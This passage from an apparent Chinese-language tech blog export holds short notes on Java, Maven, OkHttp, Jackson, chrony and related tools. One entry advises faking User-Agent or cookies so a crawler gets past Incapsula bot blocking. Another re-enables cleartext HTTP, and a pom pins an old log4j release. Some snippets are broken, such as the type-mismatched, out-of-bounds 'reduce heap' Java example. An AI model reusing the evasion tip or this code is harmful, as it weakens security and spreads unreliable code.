<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">收到的Response:</span><br><span class="line">&lt;html style=<span class="string">&quot;height:100%&quot;</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">		&lt;META NAME=<span class="string">&quot;ROBOTS&quot;</span> CONTENT=<span class="string">&quot;NOINDEX, NOFOLLOW&quot;</span>&gt;</span><br><span class="line">		&lt;meta name=<span class="string">&quot;format-detection&quot;</span> content=<span class="string">&quot;telephone=no&quot;</span>&gt;</span><br><span class="line">		&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">		&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body style=<span class="string">&quot;margin:0px;height:100%&quot;</span>&gt;</span><br><span class="line">		&lt;iframe src=<span class="string">&quot;/_Incapsula_Resource?SWUDNSAI=xxxxx&quot;</span> </span><br><span class="line">		frameborder=0 width=<span class="string">&quot;100%&quot;</span> height=<span class="string">&quot;100%&quot;</span> marginheight=<span class="string">&quot;0px&quot;</span> marginwidth=<span class="string">&quot;0px&quot;</span>&gt;</span><br><span class="line">		Request unsuccessful. Incapsula incident ID: xxxxx&lt;/iframe&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">關鍵屬性為&lt;META NAME=<span class="string">&quot;ROBOTS&quot;</span> CONTENT=<span class="string">&quot;NOINDEX, NOFOLLOW&quot;</span>&gt;</span><br><span class="line">代表對方認為你是網路爬蟲的Response回應，限制該訪問。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.若是正常合作的Request &amp; Response，請對方加入該domain白名單。</span><br><span class="line">2.若是爬蟲Process，加入headers參數:User-Agent或cookie模擬人為操作。 </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Response</category>
      </categories>
      <tags>
        <tag>Response</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Two Reduce Heap Memory Method For Java</title>
    <url>/posts/96e73436/</url>
    <content><![CDATA[<h3 id="Intro-Two-Reduce-Heap-Memory-Method-For-Java"><a href="#Intro-Two-Reduce-Heap-Memory-Method-For-Java" class="headerlink" title="Intro Two Reduce Heap Memory Method For Java"></a>Intro Two Reduce Heap Memory Method For Java</h3><span id="more"></span>
<p>這篇介紹Two Reduce Heap Memory Method For Java。</p>
<h3 id="Example-I"><a href="#Example-I" class="headerlink" title="Example I"></a>Example I</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Before:</span><br><span class="line">double[][] arrays = new double[1000][1000];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt; 10000; i++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (int j = 0; j &lt; 10000; j++) &#123;</span><br><span class="line">		double[][] temp = arrays[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">After:</span><br><span class="line">double[][] arrays = new double[1000][1000];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt; 10000; i++) &#123;</span><br><span class="line">	double[] search = arrays[i];</span><br><span class="line">	<span class="keyword">for</span> (int j = 0; j &lt; 10000; j++) &#123;</span><br><span class="line">		double[][] temp = search[j];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example-II"><a href="#Example-II" class="headerlink" title="Example II"></a>Example II</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Before:</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt; 10000; i++) &#123;</span><br><span class="line">	double[] arrays = new double[10000];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">After:</span><br><span class="line">double[] arrays = new double[10000];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt; 10000; i++) &#123;</span><br><span class="line">	Arrays.fill(arrays, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Heap</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro How to Set Include Files To WAR</title>
    <url>/posts/3cebbd76/</url>
    <content><![CDATA[<h3 id="Intro-How-to-Set-Include-Files-To-WAR"><a href="#Intro-How-to-Set-Include-Files-To-WAR" class="headerlink" title="Intro How to Set Include Files To WAR"></a>Intro How to Set Include Files To WAR</h3><span id="more"></span>
<p>這篇介紹How to Set Include Files To WAR。</p>
<h3 id="設定"><a href="#設定" class="headerlink" title="設定"></a>設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;profiles&gt;</span><br><span class="line">	&lt;profile&gt;</span><br><span class="line">		&lt;<span class="built_in">id</span>&gt;mock&lt;/id&gt;</span><br><span class="line">		&lt;build&gt;</span><br><span class="line">			&lt;plugins&gt;</span><br><span class="line">				&lt;plugin&gt;</span><br><span class="line">					&lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span><br><span class="line">					&lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">					&lt;configuration&gt;</span><br><span class="line">						&lt;archive&gt;</span><br><span class="line">							&lt;addMavenDescriptor&gt;<span class="literal">false</span>&lt;/addMavenDescriptor&gt;</span><br><span class="line">						&lt;/archive&gt;</span><br><span class="line">						&lt;warName&gt;ROOT&lt;/warName&gt;</span><br><span class="line">					&lt;/configuration&gt;</span><br><span class="line">					&lt;executions&gt;</span><br><span class="line">						&lt;execution&gt;</span><br><span class="line">							&lt;<span class="built_in">id</span>&gt;default-war&lt;/id&gt;</span><br><span class="line">							&lt;configuration&gt;</span><br><span class="line">								&lt;webResources&gt;</span><br><span class="line">									&lt;resource&gt;</span><br><span class="line">										&lt;directory&gt;target/test-classes&lt;/directory&gt;</span><br><span class="line">										&lt;targetPath&gt;WEB-INF/classes&lt;/targetPath&gt;</span><br><span class="line">									&lt;/resource&gt;</span><br><span class="line">								&lt;/webResources&gt;</span><br><span class="line">							&lt;/configuration&gt;</span><br><span class="line">						&lt;/execution&gt;</span><br><span class="line">					&lt;/executions&gt;</span><br><span class="line">				&lt;/plugin&gt;</span><br><span class="line">			&lt;/plugins&gt;</span><br><span class="line">		&lt;/build&gt;</span><br><span class="line">	&lt;/profile&gt;</span><br><span class="line">&lt;/profiles&gt;</span><br><span class="line"></span><br><span class="line">說明:將target/test-classes的檔案搬至WAR的WEB-INF/classes下</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Rocky Chroncy For Sync Time</title>
    <url>/posts/ffb29c35/</url>
    <content><![CDATA[<h3 id="Intro-Rocky-Chroncy-For-Sync-Time"><a href="#Intro-Rocky-Chroncy-For-Sync-Time" class="headerlink" title="Intro Rocky Chroncy For Sync Time"></a>Intro Rocky Chroncy For Sync Time</h3><span id="more"></span>
<p>這篇介紹Rocky Chroncy For Sync Time.</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Rocky:</span><br><span class="line">It<span class="string">&#x27;s name was chosen as a tribute to early CentOS co-founder Rocky McGaugh.</span></span><br><span class="line"><span class="string">By December 12 2021, the code repository of Rocky Linux had become the </span></span><br><span class="line"><span class="string">top-trending repository on GitHub.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Rocky 8.5 對時方式與CentOS 7系列不同，需使用chronyc</span></span><br><span class="line"><span class="string">$ vim /etc/chrony.conf</span></span><br><span class="line"><span class="string">$ server &#123;對時server&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看校時的詳細資料</span></span><br><span class="line"><span class="string">$ chronyc tracking</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看校時目的 server</span></span><br><span class="line"><span class="string">$ chronyc sources</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Rocky</category>
      </categories>
      <tags>
        <tag>Rocky</tag>
        <tag>Chroncy</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Basic TypeScript</title>
    <url>/posts/6945454e/</url>
    <content><![CDATA[<h3 id="Intro-Basic-TypeScript"><a href="#Intro-Basic-TypeScript" class="headerlink" title="Intro Basic TypeScript"></a>Intro Basic TypeScript</h3><span id="more"></span>
<p>這篇介紹TypeScript的基本語法。</p>
<h3 id="宣告-型態"><a href="#宣告-型態" class="headerlink" title="宣告-型態"></a>宣告-型態</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="keyword">function</span> f(x: i32): i32 &#123;</span><br><span class="line">    <span class="keyword">if</span> (x === 1 || x === 2) &#123;</span><br><span class="line">        <span class="built_in">return</span> 1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> f(x - 1) + f(x - 2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">說明</span><br><span class="line">x: i32 : 表示宣告一個變數x，型態為i32</span><br><span class="line">i32 &#123; : 表示這個函數的回傳型態是i32</span><br></pre></td></tr></table></figure>

<h3 id="export-宣告"><a href="#export-宣告" class="headerlink" title="export-宣告"></a>export-宣告</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="keyword">function</span> f(x: i32): i32 &#123;</span><br><span class="line">    <span class="keyword">if</span> (x === 1 || x === 2) &#123;</span><br><span class="line">        <span class="built_in">return</span> 1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> f(x - 1) + f(x - 2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">說明</span><br><span class="line"><span class="built_in">export</span> : 表示這個函數可以被javascript呼叫</span><br></pre></td></tr></table></figure>

<h3 id="declare-宣告"><a href="#declare-宣告" class="headerlink" title="declare-宣告"></a>declare-宣告</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">declare</span> <span class="keyword">function</span> <span class="built_in">log</span>(s: f64): void;</span><br><span class="line"></span><br><span class="line">說明</span><br><span class="line"><span class="built_in">declare</span> : 宣告一個外部的javascript函數，並定義相關的參數內容，這邊並沒有主體，須由外部js實作</span><br></pre></td></tr></table></figure>

<h3 id="字串預設值-設定"><a href="#字串預設值-設定" class="headerlink" title="字串預設值-設定"></a>字串預設值-設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="keyword">function</span> <span class="built_in">test</span>(arg2: string = <span class="string">&quot;abc&quot;</span>): void &#123;</span><br><span class="line"><span class="built_in">export</span> <span class="keyword">function</span> <span class="built_in">test</span>(arg2: string | null): void &#123;</span><br><span class="line"></span><br><span class="line">說明</span><br><span class="line">參數可以指定字串的預設值，如果有指定了預設值，那就是非必要傳入參數</span><br><span class="line">參數可以指定可能為null</span><br></pre></td></tr></table></figure>

<h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> test2&lt;T&gt;(arg1: T): void &#123;</span><br><span class="line">  <span class="built_in">log</span>(arg1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">說明</span><br><span class="line">表示型態未定義，不能宣告<span class="built_in">export</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Unknown Service Exception For OKHttp</title>
    <url>/posts/848ac016/</url>
    <content><![CDATA[<h3 id="Intro-Unknown-Service-Exception-For-OKHttp"><a href="#Intro-Unknown-Service-Exception-For-OKHttp" class="headerlink" title="Intro Unknown Service Exception For OKHttp"></a>Intro Unknown Service Exception For OKHttp</h3><span id="more"></span>
<p>這篇介紹Unknown Service Exception For OKHttp.</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在使用OKHttp進行http傳輸時，出現</span><br><span class="line">java.net.UnknownServiceException: CLEARTEXT communication not enabled <span class="keyword">for</span> client</span><br><span class="line"></span><br><span class="line">解決前:</span><br><span class="line">client = newClient.connectionSpecs(Collections.singletonList(spec)).build();</span><br><span class="line"></span><br><span class="line">解決後:</span><br><span class="line">client = newClient.connectionSpecs(Arrays.asList(spec, ConnectionSpec.MODERN_TLS,</span><br><span class="line">	ConnectionSpec.COMPATIBLE_TLS, ConnectionSpec.CLEARTEXT, ConnectionSpec.COMPATIBLE_TLS)).build();</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>Exception</tag>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>invalid Definition Exception</title>
    <url>/posts/4c26ebeb/</url>
    <content><![CDATA[<h3 id="Intro-error-message"><a href="#Intro-error-message" class="headerlink" title="Intro error message"></a>Intro error message</h3><span id="more"></span>
<p>這篇介紹使用jackson反序列化時出現com.fasterxml.jackson.databind.Exc.invalidDefinitionException:(No Creators, Like Default Construct, Exist): Cannot Deserialize From Object Value (No Delegate- Or Property-Based Creator)。</p>
<h3 id="Example-Code"><a href="#Example-Code" class="headerlink" title="Example Code"></a>Example Code</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">List&lt;Element&gt; list = JSONUtils.parseJsonToInstanceList(jsonString, Element.class); -&gt; 這句反序列化會有錯誤</span><br><span class="line"></span><br><span class="line">public static &lt;T&gt; List&lt;T&gt; parseJsonToInstanceList(String jsonInput, Class&lt;T&gt; clazz) &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">		<span class="built_in">return</span> JSONUtils.readValue(jsonInput,</span><br><span class="line">			TypeFactory.defaultInstance().constructCollectionType(ArrayList.class, clazz));</span><br><span class="line">	&#125; catch (IOException e) &#123;</span><br><span class="line">		LogUtils.parseError.error(<span class="string">&quot;jsonInput: &quot;</span> + jsonInput, e);</span><br><span class="line">		throw new UncheckedIOException(e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Element 物件少了沒有參數的建構子</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class Element &#123;</span><br><span class="line"></span><br><span class="line">	public <span class="function"><span class="title">Element</span></span>() &#123;</span><br><span class="line">		//加上這個建構子</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>jackson</category>
      </categories>
      <tags>
        <tag>jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery each Versus ES6 foreach Performance</title>
    <url>/posts/3d733a0c/</url>
    <content><![CDATA[<h3 id="jQuery-each-Versus-ES6-foreach-Performance"><a href="#jQuery-each-Versus-ES6-foreach-Performance" class="headerlink" title="jQuery each Versus ES6 foreach Performance"></a>jQuery each Versus ES6 foreach Performance</h3><span id="more"></span>
<p>這篇比較JQuery each 和 ES6 foreach效能。</p>
<h3 id="效能比較"><a href="#效能比較" class="headerlink" title="效能比較"></a>效能比較</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HTML:</span><br><span class="line">&lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.min.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.min.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.min.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.min.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.min.css&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">Test <span class="keyword">case</span>(ES6 Native):</span><br><span class="line">var linkEls = document.querySelectorAll(<span class="string">&#x27;link[href*=&quot;.min.css&quot;]&#x27;</span>);</span><br><span class="line">[].forEach.call(linkEls,<span class="keyword">function</span>(el)&#123;&#125;);</span><br><span class="line"></span><br><span class="line">Test <span class="keyword">case</span>(jQuery):</span><br><span class="line">$(<span class="string">&#x27;link[href*=&quot;.min.css&quot;]&#x27;</span>).each(<span class="function"><span class="title">function</span></span>()&#123;&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Result-amp-Conclusion"><a href="#Result-amp-Conclusion" class="headerlink" title="Result &amp; Conclusion:"></a>Result &amp; Conclusion:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">forEach (Native) :	forEach (Native) x 338,628 ops/sec ±2.48% (62 runs sampled)</span><br><span class="line">each (jQuery)	 :  each (jQuery) x 265,555 ops/sec ±3.18% (62 runs sampled)</span><br><span class="line"></span><br><span class="line">Fastest: forEach (Native)</span><br><span class="line">Slowest: each (jQuery)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>foreach</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro UseCountLoop Safepoints</title>
    <url>/posts/bad5d7b8/</url>
    <content><![CDATA[<h3 id="Intro-UseCountLoop-Safepoints"><a href="#Intro-UseCountLoop-Safepoints" class="headerlink" title="Intro UseCountLoop Safepoints"></a>Intro UseCountLoop Safepoints</h3><span id="more"></span>
<p>這篇介紹UseCountLoop Safepoints。</p>
<h3 id="UseCountLoopSafepoints"><a href="#UseCountLoopSafepoints" class="headerlink" title="UseCountLoopSafepoints"></a>UseCountLoopSafepoints</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">XX:+UseCountedLoopSafepoints這個參數會強制在Counted loop <span class="built_in">return</span>之前插入Safe Point，</span><br><span class="line">即使loop比較小，JVM會幫忙插入Safe Point，用於防止大loog執行時間過長導致進入</span><br><span class="line">Safe Point卡住的問題。</span><br><span class="line"></span><br><span class="line">*JDK 8u131 已fixed bug問題可以使用此參數</span><br><span class="line"></span><br><span class="line">實測此參數發現只能延緩發生的時間(約一天)以及減少發生的次數</span><br><span class="line">不能完全根治問題!</span><br><span class="line">還是要設定可用的Heap memory來防止卡住</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-String versus StringBuffer versus StringBuilder</title>
    <url>/posts/74d6a85a/</url>
    <content><![CDATA[<h3 id="Java-String-versus-StringBuffer-versus-StringBuilder"><a href="#Java-String-versus-StringBuffer-versus-StringBuilder" class="headerlink" title="Java-String versus StringBuffer versus StringBuilder"></a>Java-String versus StringBuffer versus StringBuilder</h3><span id="more"></span>
<p>這篇介紹String versus StringBuffer versus StringBuilder個別的差異以及效能上的議題。</p>
<h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">String的值是不可變的(immutable)，這造成每次對String的操作都會生成新的String物件，不僅效率低下，而且大量浪費有限的記憶體空間。</span><br><span class="line">String的操作都是call by reference而不是call by value</span><br></pre></td></tr></table></figure>

<h3 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">StringBuffer:Synchronized、thread-safe。若需要經常對字串內容進行修改，使用StringBuffer的效率最好，</span><br><span class="line">如果想轉成String型別，可以呼叫StringBuffer的toString()方法。</span><br></pre></td></tr></table></figure>

<h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">StringBuilder:non-thread-safe。StringBuilder物件被當作是一個包含字元序列的變長陣列。</span><br><span class="line">但不保證同步。該class被設計用作 StringBuffer 的一個簡易替換，用在字串緩衝區被單個執行緒使用的時候。</span><br></pre></td></tr></table></figure>

<h3 id="String和StringBuffer區別"><a href="#String和StringBuffer區別" class="headerlink" title="String和StringBuffer區別"></a>String和StringBuffer區別</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">需經常改變內容的字串不建議使用String，因為每次生成物件都會對系統性能產生影響，特別當記憶體中無引用物件多了以後，</span><br><span class="line">JVM 的 GC 就會開始工作，效能就會降低。</span><br><span class="line"></span><br><span class="line">使用 StringBuffer 時，每次都會對 StringBuffer 物件本身進行操作，而不是生成新的物件並改變物件引用。</span><br><span class="line">所以多數情況下推薦使用 StringBuffer ，特別是字串物件經常改變的情況下。</span><br></pre></td></tr></table></figure>

<h3 id="StringBuilder-versus-StringBuffer"><a href="#StringBuilder-versus-StringBuffer" class="headerlink" title="StringBuilder versus StringBuffer"></a>StringBuilder versus StringBuffer</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">StringBuilder與StringBuffer有public parent class - AbstractStringBuilder。</span><br><span class="line">StringBuilder、StringBuffer的方法都會呼叫AbstractStringBuilder中的公共方法，如super.append(…)。只是StringBuffer會在方方法上加synchronized關鍵字，進行同步。</span><br></pre></td></tr></table></figure>

<h3 id="使用建議"><a href="#使用建議" class="headerlink" title="使用建議"></a>使用建議</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.基本原則：</span><br><span class="line">如果要操作少量的資料，用String</span><br><span class="line">單執行緒操作大量資料，用StringBuilder</span><br><span class="line">多執行緒操作大量資料，用StringBuffer</span><br><span class="line"></span><br><span class="line">2.不要使用String class的<span class="string">&quot;+&quot;</span>來進行頻繁的拼接，因為那樣會頻繁建立String result儲存結果，效能極差，應該使用StringBuffer或StringBuilder class，</span><br><span class="line">在Java的優化上是一條比較重要的原則。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Performance</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-pom.xml及WebServlet設定</title>
    <url>/posts/ea47dc68/</url>
    <content><![CDATA[<h3 id="Java-pom-xml及WebServlet設定"><a href="#Java-pom-xml及WebServlet設定" class="headerlink" title="Java-pom.xml及WebServlet設定"></a>Java-pom.xml及WebServlet設定</h3><span id="more"></span>
<p>開發Java專案提供Servlet給外部廠商呼叫Api時，<br>通常有兩個地方需要設定。</p>
<h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p>1.pom.xml</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; //編碼要記得設定UTF-8，IDE的預設編碼會造成亂碼</span><br><span class="line">&lt;finalName&gt;ROOT&lt;/finalName&gt; //finalName設定ROOT的話，Api的url是http://127.0.0.1/&#123;WebServlet&#125;/&#123;method&#125;</span><br><span class="line">&lt;finalName&gt;Server&lt;/finalName&gt; //finalName設定Server的話，Api的url是http://127.0.0.1/DealerIntegationTestingServer/&#123;WebServlet&#125;/&#123;method&#125;</span><br><span class="line">------------------------------------------------分隔線---------------------------------------------------------</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">	xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">	xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">	&lt;groupId&gt;com&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;Server&lt;/artifactId&gt;</span><br><span class="line">	&lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line">	&lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">	&lt;name&gt;Server&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">		&lt;jdk.version&gt;1.8&lt;/jdk.version&gt;</span><br><span class="line">		&lt;log4j2.version&gt;2.8.2&lt;/log4j2.version&gt;</span><br><span class="line">		&lt;tomcat.version&gt;8.5.42&lt;/tomcat.version&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">	&lt;build&gt;</span><br><span class="line">		&lt;finalName&gt;ROOT&lt;/finalName&gt;</span><br><span class="line">		&lt;plugins&gt;</span><br><span class="line">			&lt;plugin&gt;</span><br><span class="line">				&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;3.6.2&lt;/version&gt;</span><br><span class="line">				&lt;configuration&gt;</span><br><span class="line">					&lt;encoding&gt;utf-8&lt;/encoding&gt;</span><br><span class="line">					&lt;<span class="built_in">source</span>&gt;<span class="variable">$&#123;jdk.version&#125;</span>&lt;/source&gt;</span><br><span class="line">					&lt;target&gt;<span class="variable">$&#123;jdk.version&#125;</span>&lt;/target&gt;</span><br><span class="line">				&lt;/configuration&gt;</span><br><span class="line">			&lt;/plugin&gt;</span><br><span class="line">		&lt;/plugins&gt;</span><br><span class="line">	&lt;/build&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;!-- log4j --&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;<span class="variable">$&#123;log4j2.version&#125;</span>&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;<span class="variable">$&#123;log4j2.version&#125;</span>&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;!-- apache commons --&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.4&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.9.3&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!-- <span class="built_in">test</span> --&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">			&lt;scope&gt;<span class="built_in">test</span>&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;!-- json --&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.7.9.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;!-- tomcat --&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">			